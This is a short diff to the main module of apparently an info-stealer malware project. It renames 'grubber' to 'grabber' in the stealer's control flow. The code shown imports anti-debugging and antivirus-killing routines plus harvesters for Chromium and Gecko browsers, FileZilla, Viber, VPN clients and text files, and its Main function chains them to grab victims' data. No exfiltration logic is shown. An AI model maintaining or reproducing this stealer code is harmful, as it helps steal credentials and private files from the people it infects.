@@ -32,7 +32,7 @@ from manager import ending
 from messengers import viber
 from browsers import chromium
 from files import Files_txt
-from files import file_grubber
+from files import file_grabber
 from secure import antiDebug
 from files import filezilla
 from vpn import vpn
@@ -45,10 +45,10 @@ from browsers import geckodriver
 def Start() -> None:
     if not Config.debuging:
         antiDebug.AntiDebug(Config.oneStart,Config.avKiller)
-    make_folder.makeFolders(Config.enableFileGrubber,Config.oneStart)
-def GrubFiles() -> None:
-    if Config.enableFileGrubber:
-        Config.msgFiles= file_grubber.Grab(Config.msgFiles)
+    make_folder.makeFolders(Config.enableFileGrabber,Config.oneStart)
+def GrabFiles() -> None:
+    if Config.enableFileGrabber:
+        Config.msgFiles= file_grabber.Grab(Config.msgFiles)
     else:
         Files_txt.TxtSteal()
     filezilla.FileZilla()
@@ -106,7 +106,7 @@ def End() -> None:
 
 def Main()-> None:
     Start()
-    GrubFiles()
+    GrabFiles()
     Browsers()
     Games()
     Messagers()
